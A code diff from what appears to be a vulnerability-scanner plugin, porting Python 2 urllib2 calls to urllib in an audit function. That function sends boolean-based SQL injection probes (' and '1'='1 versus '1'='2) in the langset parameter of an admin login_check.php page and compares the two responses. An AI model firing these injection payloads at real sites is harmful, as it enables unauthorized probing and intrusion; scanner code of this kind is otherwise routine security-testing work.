@@ -8,9 +8,9 @@ def assign(service, arg):
         return True, arg
 
 def audit(url):
-    import urllib2
-    true_url = url + "admin/login/login_check.php?langset=cn" + urllib2.quote("' and '1' ='1")
-    false_url =url + "admin/login/login_check.php?langset=cn" + urllib2.quote("' and '1' ='2")
+    import urllib.request, urllib.error, urllib.parse
+    true_url = url + "admin/login/login_check.php?langset=cn" + urllib.parse.quote("' and '1' ='1")
+    false_url =url + "admin/login/login_check.php?langset=cn" + urllib.parse.quote("' and '1' ='2")
 
     code1, head1,res1, errcode1, _ = curl.curl2(true_url)
     code2, head2,res2, errcode2, _ = curl.curl2(false_url)
